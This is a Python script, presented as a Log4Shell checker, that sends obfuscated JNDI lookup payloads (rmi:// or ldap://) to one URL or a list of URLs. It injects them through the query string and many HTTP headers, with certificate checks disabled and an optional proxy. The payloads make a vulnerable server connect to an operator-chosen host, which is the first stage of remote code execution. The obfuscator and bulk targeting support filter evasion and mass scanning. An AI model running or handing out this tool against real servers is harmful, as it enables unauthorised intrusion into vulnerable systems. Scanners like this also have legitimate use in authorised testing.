import requests, sys, subprocess, argparse
import urllib3
urllib3.disable_warnings()

def init():
    
    usage = '''Example: log4j-checker.py <[-u 127.0.0.1],[-l listurl.txt]> -a rmi://127.0.0.1:4444/a
    log4j-checker.py 127.0.0.1 ldap://127.0.0.1:4444/a
    log4j-checker.py 127.0.0.1 rmi://domain.dns.log/a
    log4j-checker.py 127.0.0.1 ldap://domain.dns.log/a
    '''

    parser = argparse.ArgumentParser(description='Log4Shell checker', usage=usage)
    parser.add_argument('-u', '--url', help='URL to check')
    parser.add_argument('-l', '--list', help='list URL to check')
    parser.add_argument('-a', '--address', help='JNDI address')
    parser.add_argument('-p', '--proxy', help='Enable proxy')
    args = parser.parse_args()
    if (not args.url and not args.list) or not args.address:
        parser.print_usage()
        exit(1)
    return args


def send_requests(url, payload, proxy):
    proxies = None
    if proxy:
        proxies = {
            'http': 'http://%s' %(proxy),
            'https': 'http://%s' %(proxy)
        }


    headers = {
        "User-Agent": payload,
        "Referer": payload,
        "X-Forwarded-For": payload,
        "Authentication": payload,
        'upgrade-insecure-requests': payload,
        'accept': payload,
        'accept-encoding': payload,
        'accept-language': payload,
        'Content-Type': payload,
        'Cache-Control': payload,
        "Authenzion": payload,
        "authenzion": payload,
        "Origin": payload,
        "cookie": payload
    }
    try:
        resp = requests.get("%s/?x=%s" %(url, payload), headers=headers, verify=False, proxies=proxies)
    except Exception as e:
        print(e)
        pass

def check_log4j(url, payloads, proxy):
    print('---------------------------------------------------------')
    print('[+] Check: %s' %(url))
    print('---------------------------------------------------------')
    for payload in payloads:
        print('----> Send payload: %s' %(payload))
        send_requests(url, payload, proxy)

def main():
    args = init()
    jndi_address = args.address
    proxy = args.proxy if args.proxy else False

    payloads = subprocess.check_output(['java', '-jar', 'CLILog4jObjuscator.jar', '%s' %(jndi_address)]).decode('ascii').split('\n')
    payloads = list(filter(None, payloads))
    payloads = [i.strip('\r') for i in payloads]

    if args.url:
        url = args.url
        check_log4j(url, payloads, proxy)
    elif args.list:
        with open(args.list, 'r') as fp:
            urls = fp.read().split('\n')
            urls = list(filter(None, urls))
            urls = [i.strip('\r') for i in urls]
            for url in urls:
                check_log4j(url, payloads, proxy)

if __name__ == '__main__':
    main()
